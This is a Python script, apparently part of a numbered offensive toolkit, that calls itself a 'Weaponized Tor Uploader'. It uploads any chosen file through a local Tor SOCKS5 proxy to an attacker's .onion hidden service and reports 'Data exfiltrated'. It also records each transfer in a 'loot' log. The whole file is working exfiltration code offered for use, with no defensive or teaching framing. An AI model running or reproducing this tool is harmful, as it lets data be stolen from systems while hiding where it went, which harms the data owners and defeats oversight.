import sys
import requests
import os

def tor_upload(onion_url, file_path, proxy_host="127.0.0.1", proxy_port=9050):
    """
    Weaponized Tor Uploader: Routes multipart file uploads through 
    the Tor SOCKS5 proxy to a hidden service (.onion).
    """
    if not os.path.exists(file_path):
        print(f"[-] File not found: {file_path}")
        return

    print(f"[*] Initializing Tor-routed exfiltration for: {file_path}")
    print(f"[*] Target Hidden Service: {onion_url}")

    # Configure SOCKS5h to ensure DNS lookups also happen over Tor
    proxies = {
        'http': f'socks5h://{proxy_host}:{proxy_port}',
        'https': f'socks5h://{proxy_host}:{proxy_port}'
    }

    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            
            print(f"[*] Attempting connection via {proxy_host}:{proxy_port}...")
            # We use a longer timeout for Tor due to multi-hop latency
            r = requests.post(onion_url, files=files, proxies=proxies, timeout=60)

        if r.status_code in [200, 201]:
            print(f"[!] SUCCESS: Data exfiltrated to Onion service.")
            print(f"[*] Response Status: {r.status_code}")
        else:
            print(f"[-] Transfer Failed. Status Code: {r.status_code}")

        # Log for audit
        with open("../loot/tor_exfil_history.log", "a") as log:
            log.write(f"Onion: {onion_url} | File: {file_path} | Status: {r.status_code}\n")

    except requests.exceptions.ConnectionError:
        print("[-] Connection Error: Is the Tor service running on the proxy port?")
    except Exception as e:
        print(f"[-] Tor Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 139_tor_upload <onion_url> <file_path> [proxy_port]")
        sys.exit(1)
    
    p_port = int(sys.argv[3]) if len(sys.argv) > 3 else 9050
    tor_upload(sys.argv[1], sys.argv[2], proxy_port=p_port)
